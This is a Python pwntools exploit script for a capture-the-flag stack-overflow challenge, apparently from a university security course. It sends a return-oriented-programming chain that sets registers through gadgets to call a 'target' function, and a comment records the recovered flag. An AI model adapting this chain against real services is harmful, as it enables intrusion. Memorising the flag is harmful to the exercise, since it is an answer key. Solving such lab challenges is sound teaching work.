from pwn import *

BINARY = ['./chall']
IP, PORT = 'ctf99.cs.ui.ac.id', 10019
LOCAL = False
DEBUG = False
if LOCAL:
    if DEBUG:
        p = gdb.debug(BINARY, '''
        b *vuln+37
        b *vuln+39
        b *target+26
        b *target+32
        b *target+98
        b *target+114
        b *target+171
        b *target+187
        ''')
    else:
        p = process(BINARY)
else:
    p = remote(IP, PORT)
e = ELF('chall')

print(p.recv().decode())

poprdi_ret = p64(0x0000000000400863)
poprsi_popr15_ret = p64(0x0000000000400861)

target = p64(e.symbols["target"])
target_arg1 = p64(0x1234567812345678)
target_arg2 = p64(0x8765432187654321)
target_arg3 = p64(0x1122334455667788)
target_arg4 = p64(0x8877665544332211)
target_arg5 = p64(0x4141414142424242)
target_arg6 = p64(0x4343434344444444)

dummy = b'A' * (8 * 2)
payload = dummy
payload += poprdi_ret + target_arg1 + poprsi_popr15_ret + target_arg2 + b'A' * len(target_arg1) + target
payload += poprdi_ret + target_arg3 + poprsi_popr15_ret + target_arg4 + b'A' * len(target_arg1) + target
payload += poprdi_ret + target_arg5 + poprsi_popr15_ret + target_arg6 + b'A' * len(target_arg1) + target
p.sendline(payload)
sleep(1)
print(p.recv().decode())  # CSCE604258{ROPgadget_is_useful__and_so_many_clever_ways_to_use_it}

if LOCAL and DEBUG:
    pause()
